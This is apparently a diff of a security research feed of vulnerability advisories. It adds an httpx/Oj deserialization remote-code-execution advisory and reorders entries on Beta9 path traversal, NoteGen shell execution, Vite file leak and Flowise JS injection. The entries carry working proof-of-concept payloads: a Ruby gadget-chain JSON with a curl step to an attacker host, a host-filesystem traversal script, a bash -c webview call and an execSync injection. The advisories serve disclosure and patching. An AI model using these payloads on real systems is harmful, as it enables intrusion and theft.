@@ -4,11 +4,142 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Mon, 16 Nov 2026 00:29:54 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 16 Nov 2026 11:05:12 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/vulnerabilities/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[httpx is vulnerable to Remote Code Execution via Oj Object-Mode JSON Deserialization]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/httpx-is-vulnerable-to-remote-code-execution-via-oj-object-mode-deserialization-cve-2026-129784/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/httpx-is-vulnerable-to-remote-code-execution-via-oj-object-mode-deserialization-cve-2026-129784/</guid>
+            <pubDate>Mon, 16 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-129784, HIGH, httpx is vulnerable to Remote Code Execution via Oj Object-Mode JSON Deserialization]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+httpx is vulnerable to Remote Code Execution via Oj Object-Mode JSON Deserialization
+
+## Component
+
+httpx (gitlab.com/os85/httpx)
+
+## Affected versions
+
+1.9.0
+
+## Description
+
+httpx parses JSON response bodies through its transcoder layer. When the oj gem is loaded and multi_json is absent from the bundle, HTTPX::Response#json decodes the body with Oj.load(response.to_s) and no mode option (lib/httpx/transcoder/json.rb), so Oj runs in its shipped default :object mode. In that mode a JSON document can instantiate any already-loaded Ruby class and set its instance variables, which turns a fetched response body into attacker-controlled Ruby objects.
+
+An attacker who can influence the URL an application fetches reaches this sink over the network with no user interaction. With ActiveSupport loaded, as in any Rails application, a universal gadget chain through ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy and ActiveSupport::Cache::Coder::LazyEntry reaches Kernel.load and executes an attacker-chosen file, giving remote code execution as the application user. The file can be staged without any upload feature: an ordinary multipart/form-data POST makes Rack materialize the body as a tempfile reachable through /dev/fd/N. Applications that keep multi_json installed, pin a safe process-wide Oj.default_options, or pass an explicit safe mode at the call site are not affected. Fixed in httpx 1.9.1.
+
+## PoC
+
+<br>
+
+**Step 1 - Build and start a vulnerable httpx 1.9.0 service**
+
+<br>
+
+The lab app loads oj before httpx, then ActiveSupport, and exposes POST /preview, which calls HTTPX.get(url).json on a client-supplied URL.
+
+```
+FROM ruby@sha256:ca8b5f9a8b6533925dfa355f7fbadb64cbfd801cb7e8fa87260ef8a2eae964cc
+RUN apk add --no-cache --virtual .build build-base \
+&& gem install httpx --version 1.9.0 --no-document \
+&& gem install oj --version 3.17.7 --no-document \
+&& gem install activesupport puma rack --no-document \
+&& apk del .build
+WORKDIR /app
+COPY app.rb .
+EXPOSE 8080
+CMD ["ruby", "app.rb"]
+```
+
+<br>
+
+```
+docker build -t httpx-victim .
+docker run -d --name httpx-victim -p 8080:8080 httpx-victim
+```
+
+<br>
+
+**Step 2 - Stage the payload through an ordinary multipart POST**
+
+<br>
+
+Rack materializes multipart file parts as tempfiles with live descriptors in the app process, so no upload feature is needed.
+
+```
+curl -s -F "file=@/tmp/payload.rb;type=application/octet-stream" http://127.0.0.1:8080/preview >/dev/null
+```
+
+<br>
+
+**Step 3 - Point /preview at the gadget document**
+
+<br>
+
+Serve a JSON document carrying the ActiveSupport chain, with value aimed at /dev/fd/N, and spray descriptor numbers downward until the staged tempfile executes:
+
+```
+{"^o":"ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy",
+ "instance":{"^o":"ActiveSupport::Cache::Coder::LazyEntry",
+             "serializer":{"^c":"Kernel"},
+             "compressor":false,"resolved":false,
+             "value":"/dev/fd/N"},
+ "method":"value","var":"@x","deprecator":{"^c":"Kernel"}}
+```
+
+<br>
+
+```
+curl -s -X POST http://127.0.0.1:8080/preview \
+  -H 'content-type: application/json' \
+  -d '{"url":"http://<attacker-host>:8899/load?fd=N"}'
+```
+
+<br>
+
+Touching the parsed value (even preview['title']) enters DeprecatedInstanceVariableProxy#method_missing, which calls LazyEntry#value, which calls Kernel.load on the staged file.
+
+<br>
+
+**Step 4 - Confirm code execution inside the container**
+
+<br>
+
+```
+docker exec httpx-victim cat /tmp/pwned.txt
+```
+
+<br>
+
+Expected output:
+
+```
+RCE via httpx+Oj :object pid=1
+```
+
+## Vulnerability Mitigations
+
+Upgrade to httpx 1.9.1 or later. The fix passes an explicit { mode: :strict } default to Oj.load in lib/httpx/transcoder/json.rb, so response bodies can no longer instantiate Ruby objects. The change is commit eeb785d ("json: fix oj integration to avoid RCE mode") and is in the v1.9.1 tag.
+
+If upgrading is not possible, pass a safe mode at the call site (response.json(mode: :strict)), or set a safe process-wide default such as Oj.default_options = { mode: :strict } before any untrusted JSON is parsed. Keeping multi_json in the bundle also avoids the Oj fallback entirely.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-129784
+https://gitlab.com/os85/httpx/-/commit/eeb785d3250eee9379494fb62c37c315a31e327c
+https://github.com/HoneyryderChuck/httpx/commit/eeb785d3250eee9379494fb62c37c315a31e327c
+https://github.com/HoneyryderChuck/httpx/releases/tag/v1.9.1
+https://gitlab.com/os85/httpx
+https://github.com/HoneyryderChuck/httpx
+https://rubygems.org/gems/httpx
+https://github.com/ohler55/oj/blob/develop/pages/Security.md
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></title>
             <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</link>
@@ -216,141 +347,6 @@ https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
-            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
-
-
-## Component
-
-Beta9 gateway and worker (github.com/beam-cloud/beta9)
-
-## Affected versions
-
-gateway < 0.1.776
-worker < 0.1.756
-
-## Description
-
-A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
-
-A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
-
-Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
-
-## PoC
-
-<br>
-
-**Step 1 - Install the client and select the deployment**
-
-<br>
-
-```
-pip install beta9
-beta9 configure --token <ANY_WORKSPACE_TOKEN>
-```
-
-<br>
-
-**Step 2 - Save the volume deploy**
-
-<br>
-
-The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
-
-```
-import os
-
-from beta9 import Image, function
-from beta9.abstractions.volume import Volume
-
-
-class TraversalVolume(Volume):
-    def __init__(self, volume_id: str, mount_path: str):
-        super().__init__(name="poc", mount_path=mount_path)
-        self.volume_id = volume_id
-        self.ready = True
-
-
-HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
-
-
-@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
-def read_worker_host():
-    proof = {}
-    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
-        try:
-            with open(f) as fh:
-                proof[f] = fh.read()[:200]
-        except Exception as e:
-            proof[f] = f"<unreadable: {e}>"
-    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
-    return proof
-
-
-if __name__ == "__main__":
-    result = read_worker_host.remote()
-    print("\n===== PoC result (executed inside the sandboxed container) =====")
-    for k, v in result.items():
-        print(f"\n--- {k} ---\n{v}")
-```
-
-<br>
-
-**Step 3 - Deploy and run it**
-
-<br>
-
-```
-python3 poc_volume_traversal.py
-```
-
-<br>
-
-Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
-
-```
-===== PoC result (executed inside the sandboxed container) =====
-
---- /pwn/etc/hostname ---
-<worker hostname>
-
---- /pwn/etc/resolv.conf ---
-<worker resolver configuration>
-
---- /pwn (host /) ---
-['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
-```
-
-<br>
-
-On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
-
-## Vulnerability Mitigations
-
-Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
-
-The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-120308
-https://github.com/beam-cloud/beta9/pull/1897
-https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
-https://github.com/beam-cloud/beta9
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths]]></title>
             <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</link>
             <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</guid>
@@ -554,6 +550,141 @@ https://www.cve.org/CVERecord?id=CVE-2026-120307
 https://github.com/beam-cloud/beta9/pull/1897
 https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
+
+
+## Component
+
+Beta9 gateway and worker (github.com/beam-cloud/beta9)
+
+## Affected versions
+
+gateway < 0.1.776
+worker < 0.1.756
+
+## Description
+
+A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
+
+A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
+
+Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the client and select the deployment**
+
+<br>
+
+```
+pip install beta9
+beta9 configure --token <ANY_WORKSPACE_TOKEN>
+```
+
+<br>
+
+**Step 2 - Save the volume deploy**
+
+<br>
+
+The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
+
+```
+import os
+
+from beta9 import Image, function
+from beta9.abstractions.volume import Volume
+
+
+class TraversalVolume(Volume):
+    def __init__(self, volume_id: str, mount_path: str):
+        super().__init__(name="poc", mount_path=mount_path)
+        self.volume_id = volume_id
+        self.ready = True
+
+
+HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
+
+
+@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
+def read_worker_host():
+    proof = {}
+    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
+        try:
+            with open(f) as fh:
+                proof[f] = fh.read()[:200]
+        except Exception as e:
+            proof[f] = f"<unreadable: {e}>"
+    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
+    return proof
+
+
+if __name__ == "__main__":
+    result = read_worker_host.remote()
+    print("\n===== PoC result (executed inside the sandboxed container) =====")
+    for k, v in result.items():
+        print(f"\n--- {k} ---\n{v}")
+```
+
+<br>
+
+**Step 3 - Deploy and run it**
+
+<br>
+
+```
+python3 poc_volume_traversal.py
+```
+
+<br>
+
+Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
+
+```
+===== PoC result (executed inside the sandboxed container) =====
+
+--- /pwn/etc/hostname ---
+<worker hostname>
+
+--- /pwn/etc/resolv.conf ---
+<worker resolver configuration>
+
+--- /pwn (host /) ---
+['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
+```
+
+<br>
+
+On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
+
+## Vulnerability Mitigations
+
+Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
+
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120308
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
 https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
@@ -1625,6 +1756,74 @@ https://github.com/MoonshotAI/kimi-code/releases/tag/%40moonshot-ai%2Fkimi-code%
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
+            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
+
+
+## Component
+
+note-gen (NoteGen)
+
+## Affected versions
+
+< 0.32.0
+
+## Description
+
+NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
+
+## PoC
+
+<br>
+
+**Step 1 - Obtain JavaScript execution in the NoteGen webview**
+
+<br>
+
+Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
+
+<br>
+
+**Step 2 - Invoke the Tauri shell execute API**
+
+<br>
+
+From the webview, call:
+
+```javascript
+window.__TAURI__.core.invoke('plugin:shell|execute', {
+  program: 'bash',
+  args: ['-c', 'open -a Calculator'],
+  options: { cwd: null, env: null, encoding: 'utf-8' }
+});
+```
+
+<br>
+
+**Step 3 - Verify OS command execution**
+
+<br>
+
+Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
+
+## Vulnerability Mitigations
+
+Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
+
+## References
+https://github.com/advisories/GHSA-r5ff-hq22-rhgv
+https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
+https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[NoteGen is vulnerable to Chat Preview XSS via Unsanitized AI/Skill HTML Rendering]]></title>
             <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</link>
             <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</guid>
@@ -1702,74 +1901,6 @@ Upgrade to NoteGen 0.32.0 or later. The fix replaces unsanitized markdown-it HTM
 ## References
 https://github.com/advisories/GHSA-gwhc-vprp-gfcg
 https://github.com/codexu/note-gen/commit/ae3ba948c41d8a74b4a20f4c6f26fcdda2002298
-https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
-            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
-
-
-## Component
-
-note-gen (NoteGen)
-
-## Affected versions
-
-< 0.32.0
-
-## Description
-
-NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
-
-## PoC
-
-<br>
-
-**Step 1 - Obtain JavaScript execution in the NoteGen webview**
-
-<br>
-
-Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
-
-<br>
-
-**Step 2 - Invoke the Tauri shell execute API**
-
-<br>
-
-From the webview, call:
-
-```javascript
-window.__TAURI__.core.invoke('plugin:shell|execute', {
-  program: 'bash',
-  args: ['-c', 'open -a Calculator'],
-  options: { cwd: null, env: null, encoding: 'utf-8' }
-});
-```
-
-<br>
-
-**Step 3 - Verify OS command execution**
-
-<br>
-
-Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
-
-## Vulnerability Mitigations
-
-Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
-
-## References
-https://github.com/advisories/GHSA-r5ff-hq22-rhgv
-https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
 https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
 ]]></content:encoded>
         </item>
@@ -3190,54 +3321,6 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Vite arbitrary remote HTML file leak
-
-## Component
-
-[vite](https://www.npmjs.com/package/vite)
-
-## Affected versions
-
-\>=7.1.0,<=7.1.4
-
-\>=7.0.0,<=7.0.6
-
-\>=6.0.0,<=6.3.5
-
-<=5.4.19
-
-## Description
-
-This vulnerability allows a remote attacker to leak any HTML file on the system.
-
-## PoC
-
-Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
-
-```shell
-curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this vulnerability 
-
-
-
-## References
-
-[Fix PR](https://github.com/vitejs/vite/pull/20736)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Vite arbitrary restricted remote file leak]]></title>
             <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-private-file-leak/</link>
             <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-private-file-leak/</guid>
@@ -3306,6 +3389,54 @@ No mitigations are supplied for this vulnerability
 ## References
 
 [Fix PR](https://github.com/vitejs/vite/pull/20735)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Vite arbitrary remote HTML file leak]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/vite-arbitrary-html-file-leak/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-58752, CRITICAL, Vite arbitrary remote HTML file leak]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Vite arbitrary remote HTML file leak
+
+## Component
+
+[vite](https://www.npmjs.com/package/vite)
+
+## Affected versions
+
+\>=7.1.0,<=7.1.4
+
+\>=7.0.0,<=7.0.6
+
+\>=6.0.0,<=6.3.5
+
+<=5.4.19
+
+## Description
+
+This vulnerability allows a remote attacker to leak any HTML file on the system.
+
+## PoC
+
+Assuming a vite server is running on localhost, and `somefile.html` exists at the root directory
+
+```shell
+curl -v --path-as-is 'http://localhost:5173/../../../../../../../../../../../somefile.html'
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this vulnerability 
+
+
+
+## References
+
+[Fix PR](https://github.com/vitejs/vite/pull/20736)
 ]]></content:encoded>
         </item>
         <item>
@@ -3391,6 +3522,60 @@ additional_authorized_imports=[],executor_type='wasm')
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Flowise JS injection remote code execution]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
+            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Unintended dynamic code execution leads to remote code execution by network attackers
+
+## Component
+
+[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
+
+## Affected versions
+
+(,)
+
+## Description
+
+User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
+
+
+## PoC
+
+Send the following payload to the `node-load-method/customMCP` API endpoint -
+
+```json
+{
+    "inputs":
+    {
+        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
+    },
+    "loadMethod": "listActions"
+}
+```
+
+
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Flowise OS command remote code execution]]></title>
             <link>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</link>
             <guid>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</guid>
@@ -3439,60 +3624,6 @@ Send the following payload to the `node-load-method/customMCP` API endpoint -
 ## Vulnerability Mitigations
 
 No mitigations are supplied for this issue
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Flowise JS injection remote code execution]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
-            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Unintended dynamic code execution leads to remote code execution by network attackers
-
-## Component
-
-[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
-
-## Affected versions
-
-(,)
-
-## Description
-
-User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
-
-
-## PoC
-
-Send the following payload to the `node-load-method/customMCP` API endpoint -
-
-```json
-{
-    "inputs":
-    {
-        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
-    },
-    "loadMethod": "listActions"
-}
-```
-
-
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
 
 ## References
 
@@ -3908,102 +4039,6 @@ It is recommended to switch to this maintained library if possible.
 ## References
 
 [Original advisory](https://github.com/mholt/archives/issues/27)]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PeerTube ActivityPub Crawl Infinite Loop DoS]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-crawl-dos/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-crawl-dos/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32947 High severity. PeerTube ActivityPub Crawl Infinite Loop DoS]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any attacker to cause the server to stop responding to requests due to an infinite loop.
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. The function **crawlCollectionPage** is in charge of iterating through an ActivityPub OrderedCollection object that is sent to the server. Ordered collections may be separated into pages. If the ordered collection has the **first** property, the code fetches the first page, and then uses every page’s **next** property for fetching the next page. 
-
-```js
-const limit = ACTIVITY_PUB.FETCH_PAGE_LIMIT
-let i = 0
-let nextLink = firstBody.first
-
-while (nextLink && i < limit) {
-    let body: any
-
